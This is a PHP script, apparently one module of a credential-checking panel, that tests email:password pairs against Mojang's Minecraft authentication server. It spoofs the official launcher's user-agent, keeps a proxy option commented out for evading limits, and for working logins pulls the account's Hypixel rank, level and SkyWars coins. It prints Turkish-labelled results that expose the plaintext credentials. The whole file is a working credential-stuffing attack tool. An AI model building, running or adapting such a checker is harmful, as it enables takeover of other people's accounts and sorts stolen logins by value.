<?php
include "../../server/authcontrol.php";

$lista = htmlspecialchars($_GET['lista']);
$array = explode(":", $lista);

$mail = trim($array[0]);
$pass = trim($array[1]);

$url = 'https://authserver.mojang.com/authenticate';
$proxy = '95.170.156.220:808';
//$proxyauth = 'user:password';
$agent = 'MinecraftLauncher/2.2.911(Windows 10 Pro; 10.0; x86_64)';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'Host: authserver.mojang.com',
  'User-Agent: MinecraftLauncher/2.2.911(Windows 10 Pro; 10.0; x86_64)',
  'Accept: */*',
  'Content-Type: application/json'
));
// curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt(
  $ch,
  CURLOPT_POSTFIELDS,
  '{"password":"' . $pass . '","requestUser":true,"username":"' . $mail . '"}'
);
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $agent);
$curl_scraped_page = curl_exec($ch);
$fim = json_decode($curl_scraped_page, true);
if (empty($fim['error'])) {
  $token = $fim['accessToken'];
  $fim['error'] = "a";
}
if ($fim['error'] != 'ForbiddenOperationException') {
  $urll = 'https://api.minecraftservices.com/minecraft/profile';
  $agent = 'MinecraftLauncher/2.2.911(Windows 10 Pro; 10.0; x86_64)';
  $curl = curl_init();
  curl_setopt($curl, CURLOPT_URL, $urll);
  curl_setopt($curl, CURLOPT_HTTPHEADER, array(
    'Host: api.minecraftservices.com',
    'User-Agent: MinecraftLauncher/2.2.911(Windows 10 Pro; 10.0; x86_64)',
    'Accept: */*',
    'Authorization: Bearer ' . $token . '',
    'Content-Type: application/json',
    'Accept-Encoding: gzip, deflate'
  ));
  // curl_setopt($ch, CURLOPT_PROXY, $proxy);
  //curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
  curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
  $curl_scraped_pagee = curl_exec($curl);
  $fim2 = json_decode($curl_scraped_pagee, true);
  $name = $fim2['name'];
  curl_close($curl);

  $urlll = 'https://api.slothpixel.me/api/players/' . $name . '';
  $curll = curl_init();
  curl_setopt($curll, CURLOPT_URL, $urlll);
  curl_setopt($curll, CURLOPT_HTTPHEADER, array(
    'User-Agent: MinecraftLauncher/2.2.911(Windows 10 Pro; 10.0; x86_64)',
    'Pragma: no-cache',
    'Accept: */*'
  ));
  // curl_setopt($ch, CURLOPT_PROXY, $proxy);
  //curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
  curl_setopt($curll, CURLOPT_RETURNTRANSFER, 1);
  $curl_scraped = curl_exec($curll);
  //echo $curl_scraped;
  function Capture($str, $starting_word, $ending_word)
  {
    $subtring_start  = strpos($str, $starting_word);
    $subtring_start += strlen($starting_word);
    $size            = strpos($str, $ending_word, $subtring_start) - $subtring_start;
    return substr($str, $subtring_start, $size);
  };
  $rank = Capture($curl_scraped, '"rank":', ',');
  switch ($rank) {
    case 'null':
      $rank = "Normal";
      break;
  }
  $sky1 = Capture($curl_scraped, '"SkyWars":', ',"lo');
  $skycoin = Capture($sky1, '{"coins":', ',"');
  $level = Capture($curl_scraped, 'level":', ',"');
  $experince = Capture($curl_scraped, 'experience":', ',"');
  curl_close($curll);
  echo "MİNECRAFT | ✅ #Aktif - $mail:$pass - Kullanıcı Adı: $name - Hypixel Rank'ı: $rank - Hypixel Leve: $level - Hypixel Experince: $experince - Skywars Coin'i - $skycoin";
} else {
  echo 'MİNECRAFT | ❌ #Kapalı - ' . $mail . ':' . $pass;
}
curl_close($ch);
